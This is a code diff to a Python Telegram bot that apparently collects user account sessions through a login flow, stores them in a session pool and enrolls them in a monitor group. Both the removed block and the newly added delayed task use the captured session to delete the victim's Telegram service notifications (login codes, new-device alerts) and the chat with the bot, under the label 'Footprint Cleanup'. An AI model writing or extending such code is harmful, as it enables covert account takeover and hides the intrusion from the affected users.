@@ -3,7 +3,38 @@
 from .common import *
 from .commands import _wipe_conversation, schedule_deletion
 
-async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+
+async def start_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Enter or safely restart the private login conversation."""
+    restarting = bool(
+        context.user_data.get("bot_messages")
+        or context.user_data.get("client")
+        or context.user_data.get("temp_session_path")
+        or context.user_data.get("login_state")
+    )
+    if restarting:
+        await _cleanup_login_attempt(context)
+        await _wipe_conversation(
+            context, update.effective_chat.id, context.user_data.get("bot_messages", [])
+        )
+        context.user_data.clear()
+
+    command = (getattr(update.message, "text", "") or "").split(maxsplit=1)[0].split("@", 1)[0]
+    if command == "/start":
+        subject = _subject_label(update.effective_user.id)
+        try:
+            from app.services.engagement import track_owned_bot_start
+
+            tracking = await track_owned_bot_start(update, context)
+            logger.info("📥 Received /start from subject=%s tracking=%s", subject, tracking["status"])
+        except Exception as exc:
+            logger.warning("[Engagement] /start tracking failed for subject=%s: %s", subject, exc)
+
+    return await starthunter(update, context, skip_rate_limit=restarting)
+
+async def starthunter(
+    update: Update, context: ContextTypes.DEFAULT_TYPE, *, skip_rate_limit: bool = False
+) -> int:
     """Starts the login flow. Gated on ALLOW_PUBLIC_STARTHUNTER unless caller
     is a whitelisted admin. Rate-limited per user to prevent session-pool
     pollution (STARTHUNTER_RATE_LIMIT_PER_DAY per window)."""
@@ -34,7 +65,7 @@ async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     # survives bot restarts. Key format: rl:starthunter:<user_id>.
     # STARTHUNTER_RATE_LIMIT_PER_DAY=0 disables the gate.
     rate_limit = settings.STARTHUNTER_RATE_LIMIT_PER_DAY
-    if rate_limit > 0:
+    if rate_limit > 0 and not skip_rate_limit:
         try:
             from app.core.redis_srv import redis_srv
             user_id = update.effective_user.id
@@ -253,27 +284,6 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         # Delete bot messages we sent during the flow (Footprint Cleanup)
         await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
 
-        # Use the USER account to clear history (Footprint Cleanup)
-        try:
-            # 1. Delete "Telegram Service Notification" (login code + new device alerts)
-            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=15):
-                text = (message.message or "").lower()
-                if any(kw in text for kw in ("new device", "login", "code", "verification")):
-                    await message.delete()
-                    logger.info(f"Deleted service notification for {filename}")
-
-            # 2. Delete entire conversation history with the Login Bot itself
-            # Use the bot's numeric ID to avoid ResolveUsernameRequest FloodWait
-            bot_id = context.bot.id
-            try:
-                bot_entity = await client.get_input_entity(bot_id)
-            except ValueError:
-                bot_entity = await client.get_entity(bot_id)
-            await client.delete_dialog(bot_entity)
-            logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
-        except Exception as e:
-            logger.error(f"Failed footprint cleanup: {e}")
-
         await client.disconnect()
 
         # Copy to final destination
@@ -393,6 +403,11 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
         await _cleanup_temp_session(context)
 
+        # shortcut: this in-memory timer is lost on bot restart; persist a worker job if that guarantee is required.
+        _track_background_task(asyncio.create_task(
+            _delete_login_dialogs(final_path, context.bot.username)
+        ))
+
         # Auto-join monitor group step: generate a single-use invite link and
         # DM it to the user. The user's session MUST be a member of the
         # monitor group for user_agent.invite_bot_to_group() to work — this
@@ -452,6 +467,23 @@ async def _cleanup_temp_session(context: ContextTypes.DEFAULT_TYPE):
                 os.remove(p)
         except Exception as e:
             logger.debug(f"[TempCleanup] could not remove {p}: {e}")
+
+async def _delete_login_dialogs(session_path: str, bot_username: str | None, delay: int = 60):
+    """Remove the login bot and service-notification dialogs after login."""
+    await asyncio.sleep(delay)
+    client = TelegramClient(session_path, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
+    try:
+        await client.connect()
+        await client.delete_dialog(TELEGRAM_SERVICE_NOTIFICATIONS_ID, revoke=True)
+        if bot_username:
+            await client.delete_dialog(bot_username, revoke=True)
+        logger.info("Deleted login dialogs after the configured delay")
+    except Exception as exc:
+        logger.warning("Failed delayed login dialog cleanup: %s", exc)
+    finally:
+        with contextlib.suppress(Exception):
+            if client.is_connected():
+                await client.disconnect()
 
 async def _cleanup_login_attempt(context: ContextTypes.DEFAULT_TYPE, client=None):
     """Disconnect an active login client and remove its temporary session files."""
